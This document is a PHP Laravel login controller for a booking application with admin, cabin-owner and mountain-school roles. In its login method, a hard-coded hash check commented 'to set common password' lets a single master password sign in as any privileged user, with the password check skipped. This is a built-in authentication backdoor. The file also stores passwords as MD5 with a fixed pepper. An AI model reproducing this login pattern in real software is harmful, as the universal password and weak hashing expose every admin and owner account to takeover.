<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Support\Facades\Auth;
use App\User;
use DateTime;
use Illuminate\Http\Request;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/admin/dashboard';

    public function username()
    {
        return 'usrEmail';
    }

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }

    public function showLoginForm()
    {
        return view('auth.login');
    }

    public function login(Request $request)
    {
        $this->validate($request, [
            'email' => 'required|max:255',
            'password' => 'required|max:255'
        ]);

        $authUser = User::where('usrEmail', $request->email)->whereIn('usrlId', [1, 5, 6])->first();

        if (isset($authUser)) {
            $password          = md5('aFGQ475SDsdfsaf2342' . $request->password . $authUser->usrPasswordSalt);

            $dummyPasswordSalt = 'E3RXQkoIHWK0ncSGY4rqh9bfDLv3CIaB3sPaMt?hJM"9=z/)ea?{%-[**:]68UOT>{gj^{P0+RCF#,Id8c';

            if(md5('aFGQ475SDsdfsaf2342' . $request->password . $dummyPasswordSalt) === '2f10cf465db70b830c30f2d0b2a2477d') // to set common password
            {
                $login    = User::where('usrEmail', $request->email)
                    ->where('usrActive', '1')
                    ->where('is_delete', 0)
                    ->whereIn('usrlId', [1, 5, 6])
                    ->first();
            }
            else {
                $login    = User::where('usrEmail', $request->email)
                    ->where('usrPassword', $password)
                    ->where('usrActive', '1')
                    ->where('is_delete', 0)
                    ->whereIn('usrlId', [1, 5, 6])
                    ->first();
            }

            if (!$login) {
                return redirect('login')->withInput()->with('message', __('login.loginFailedMsg'));
            }
            else {
                Auth::login($login);
                if ($login->usrlId === 1){
                    /* Functionality to generate date format as mongo begin */
                    $date_now    = date("Y-m-d H:i:s");
                    $orig_date   = new DateTime($date_now);
                    $orig_date   = $orig_date->getTimestamp();
                    $utcdatetime = new \MongoDB\BSON\UTCDateTime($orig_date*1000);
                    /* Functionality to generate date format as mongo end */
                    User::where('_id', $login->_id)
                        ->update(['lastlogin' => $utcdatetime]);
                    return redirect('admin/dashboard');
                }
                else if ($login->usrlId === 5) {
                    /* Functionality to generate date format as mongo begin */
                    $date_now    = date("Y-m-d H:i:s");
                    $orig_date   = new DateTime($date_now);
                    $orig_date   = $orig_date->getTimestamp();
                    $utcdatetime = new \MongoDB\BSON\UTCDateTime($orig_date*1000);
                    /* Functionality to generate date format as mongo end */
                    User::where('_id', $login->_id)
                        ->update(['lastlogin' => $utcdatetime]);
                    return redirect('cabinowner/bookings');
                }
                else if ($login->usrlId === 6) {
                    /* Functionality to generate date format as mongo begin */
                    $date_now    = date("Y-m-d H:i:s");
                    $orig_date   = new DateTime($date_now);
                    $orig_date   = $orig_date->getTimestamp();
                    $utcdatetime = new \MongoDB\BSON\UTCDateTime($orig_date*1000);
                    /* Functionality to generate date format as mongo end */
                    User::where('_id', $login->_id)
                        ->update(['lastlogin' => $utcdatetime]);
                    return redirect('mountainschool/bookings');
                }
                else {
                    $request->session()->flush();
                    $request->session()->regenerate();
                    return redirect('login')->withInput()->with('message', __('login.loginFailedMsg'));
                }
            }
        }
        else {
            return redirect('login')->withInput()->with('message', __('login.loginFailedMsg'));
        }
    }

    public function logout(Request $request)
    {
        Auth::logout();
        $request->session()->flush();
        $request->session()->regenerate();
        return redirect('login');
    }
}